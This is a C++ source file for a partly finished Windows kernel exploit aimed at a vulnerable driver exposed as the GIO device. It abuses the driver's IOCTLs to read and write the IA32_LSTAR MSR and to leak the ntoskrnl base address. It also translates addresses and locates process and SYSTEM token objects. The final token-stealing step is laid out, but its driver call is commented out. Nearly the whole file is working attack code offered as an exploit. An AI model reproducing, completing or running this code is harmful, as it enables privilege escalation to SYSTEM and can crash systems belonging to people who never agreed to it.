
// gdrv_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>

#define IOCTL_MmGetPhysicalAddress 0xC350280C

/*

For using MmMapIoSpace(), we need to obtain a "Phyiscal Address" as the first argument.
TODO:
    - Research the differences between IOCTL_MmMapIoSpace & IOCTL_MmMapIoSpace2 (The IOCTL number
      isn't 100% clear, but it seems to be 0xC3502840, further research is required).
    
    - IOCTL_MmMapIoSpace seems to be an "Arbitrary Read" vulnerability

*/

#define IOCTL_MmMapIoSpace         0xC3502000
#define IOCTL_MmMapIoSpace2        0xC3502840

// For readmsr():
// IOCTL IOCTL 0xC3502580
// InputBufferLength == OutputBufferLength && InputBufferLength == 16
// can be used to leak the IA32_LSTAR MSR address 
#define IOCTL_readmsr_caller       0xC3502580   

// For writemsr():
// IOCTL 0xC3502580
// *(DWORD*)PSystemBuffer == 1
// can be used to write the IA32_LSTAR MSR and overwrite KiSystemCall64() address
#define IOCTL_writemsr_caller      0xC3502580   
#define IOCTL_ZwUnmapViewOfSection 0xC3502008

#pragma comment(lib, "ntdll")

#define SystemHandleInformation 0x10
//#define SystemHandleInformationSize 1024 * 1024 * 2

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

extern "C" NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;



ULONG_PTR ReadMSR(DWORD MSRIndex)
{
    printf("[+] in ReadMSR...\nPress Enter to continue...");
    getchar();
    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }
    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    InputBuffer[0] = 1; // 1 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_readmsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr)) 
    {
        printf("[+] ReadMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_readmsr_caller);

        DWORD HighDWORD = OutputBuffer[3];
        DWORD LowDWORD = OutputBuffer[2];

        UINT64 KiSystemCall64Address = ((UINT64)HighDWORD << 32) | (UINT64)LowDWORD;
        printf("[+] Leaked nt!KiSystemCall64 address: 0x%p\n", KiSystemCall64Address);

        // --- Clearing and returning---
        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return KiSystemCall64Address;
    }

    printf("[-] Unable to call IOCTL 0x%x: GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;
}

ULONG_PTR LeakNtoskrnlBaseAddress()
{
    DWORD MSRIndex = 0xC0000082;
    ULONG_PTR KiSystemCall64Address = ReadMSR(MSRIndex);
    DWORD IAT_Offset = 0x40C600; // This might be different between versions of Windows !!!
    
    printf("[+] IAT offset of nt!KiSystemCall64: 0x%x\n", IAT_Offset);

    // ntoskrnl.exe base address can be found in IDA under: Edit -> Segments -> Rebase Program...
    ULONG_PTR BaseAddress = KiSystemCall64Address - IAT_Offset;
    printf("[+] Leaked ntoskrnl.exe base address: 0x%p\n", BaseAddress);

    return BaseAddress;
}


// Haven't tested it yet!!
VOID WriteMSR(DWORD MSRIndex, ULONG_PTR Overwrite)
{
    printf("[+] in WriteMSR...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    DWORD LowDWORD = (DWORD)(Overwrite & 0xFFFFFFFF);           // obtain lower DWORD of Overwrite variable
    DWORD HighDWORD = (DWORD)((Overwrite >> 32) & 0xFFFFFFFF);  // obtain higher DWORD of Overwrite variable

    InputBuffer[0] = 0;         // 0 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;  // The MSR register index that we want to overwrite
    InputBuffer[2] = LowDWORD;  // Lower 32-bit value that the MSR will be overwritten with
    InputBuffer[3] = HighDWORD; // Higher 32-bit value that the MSR will be overwritten with

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_writemsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        DebugBreak();
        printf("[+] WriteMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_writemsr_caller);
    }
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);

}

DWORD GetPhysicalAddress(ULONG_PTR VirtualAddress)
{
    printf("[+] in GetPhysicalAddress()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 8);      // 8 bytes virtual address to be translated
    DWORD* OutputBuffer = (DWORD*)calloc(1, 4);

    //RtlCopyMemory(InputBuffer, &VirtualAddress, )
    DWORD BytesReturned = 0;
    DWORD PhysicalAddress = 0;
    if (DeviceIoControl(hDevice, IOCTL_MmGetPhysicalAddress, &VirtualAddress, 8, OutputBuffer, 4, &BytesReturned, nullptr))
    {
        PhysicalAddress = *OutputBuffer;
        printf("[+] GetPhysicalAddress() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmGetPhysicalAddress);
        printf("[+] Physical Address returned for 0x%p is: 0x%x\n", VirtualAddress, PhysicalAddress);

        free(InputBuffer);
        free(OutputBuffer);
        CloseHandle(hDevice);
        return PhysicalAddress;
    }

    printf("[-] Unabled to execute IOCTL_MmGetPhysicalAddress, GetLastError(): %u\n", GetLastError());
    free(InputBuffer);
    free(OutputBuffer);
    CloseHandle(hDevice);

    return -1;

}

PVOID LeakProcessAddress(DWORD TargetPID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    PSYSTEM_HANDLE_INFORMATION SystemInformation = NULL;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    ULONG SystemHandleInformationSize = 0x100000;

    PVOID ObjectAddress = NULL;
    DWORD PID = 0;

    do {
        if (SystemInformation)
            free(SystemInformation);

        SystemInformation = (PSYSTEM_HANDLE_INFORMATION)calloc(1, SystemHandleInformationSize);
        if (!SystemInformation) {
            printf("Memory allocation failed!\n");
            return NULL;
        }

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
            SystemInformation, SystemHandleInformationSize, &SystemHandleInformationSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed with status: 0x%x\n", status);
        free(SystemInformation);
        return NULL;
    }

    for (int i = 0; i < SystemInformation->NumberOfHandles; i++)
    {
        PID = SystemInformation->Handles[i].UniqueProcessId;
        if (PID != TargetPID)
            continue;
        
        if (SystemInformation->Handles[i].ObjectTypeIndex == 7)
        {
            ObjectAddress = SystemInformation->Handles[i].Object;
            printf("[*] PID: %d | _EPROCESS Object Address: 0x%p\n", PID, ObjectAddress);
            break;
        }
;
    }
    if (!ObjectAddress)
       printf("[-] Object Address not found: GetLastError(): %u\n", GetLastError());

    CloseHandle(hProcess);
    free(SystemInformation);

    return ObjectAddress;
}


VOID Exploit()
{
    printf("[+] In Exploit()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    ULONG_PTR  CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;

    printf("[*] SYSTEM Token Address: 0x%p\n", SystemTokenAddress);
    printf("[*] Local Process Token Address: 0x%p\n", CurrentProcessTokenAddress);

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x1000);      // 8 bytes virtual address to be translated
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x1000);

    DWORD SystemTokenPhysicalAddress = GetPhysicalAddress(SystemTokenAddress);
    printf("[*] System Token Physical Address: 0x%x\n", SystemTokenPhysicalAddress);

    InputBuffer[2] = SystemTokenPhysicalAddress;
    InputBuffer[5] = 8;
    
    //DWORD SystemTokenPhysicalAddress = GetPhysicalAddress(SystemTokenAddress);
    //DWORD NumberOfBytes = 8;
    //RtlCopyMemory((InputBuffer + 8), &SystemTokenPhysicalAddress, 4);
    //RtlCopyMemory((InputBuffer + 20), &NumberOfBytes, 4);
    //RtlCopyMemory((InputBuffer + 24), &CurrentProcessTokenAddress, 8);

    //DWORD BytesReturned = 0;
    //if (DeviceIoControl(hDevice, IOCTL_MmMapIoSpace, InputBuffer, 0x1000, OutputBuffer, 0x1000, &BytesReturned, nullptr))
    //{
    //    DebugBreak();
    //    printf("[+] Exploit() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmMapIoSpace);
    //}

    CloseHandle(hDevice);
    free(InputBuffer);
    free(OutputBuffer);
}


int main()
{
    printf("[*] Starting execution...\n");
    
    //ULONG_PTR BaseAddress = LeakNtoskrnlBaseAddress();

    // Overwriting IA32_LSTAR MSR with KUSER_SHARED_DATA base address
    // Will cause a BSOD!!
    //WriteMSR(0xC0000082, 0xfffff78000000000); 

    //DWORD KUSER_VirtualAddress = GetPhysicalAddress(0xfffff78000000000);
    //printf("Physical Address from main(): 0x%x\n", KUSER_VirtualAddress);
    //PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    //PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    //ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    //ULONG_PTR  CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;

    //printf("[*] SYSTEM Token Address: 0x%p\n", SystemTokenAddress);
    //printf("[*] Local Process Token Address: 0x%p\n", CurrentProcessTokenAddress);

    Exploit();

    printf("[+] Press Enter to finish execution...\n");
    getchar();

    return 0;
}

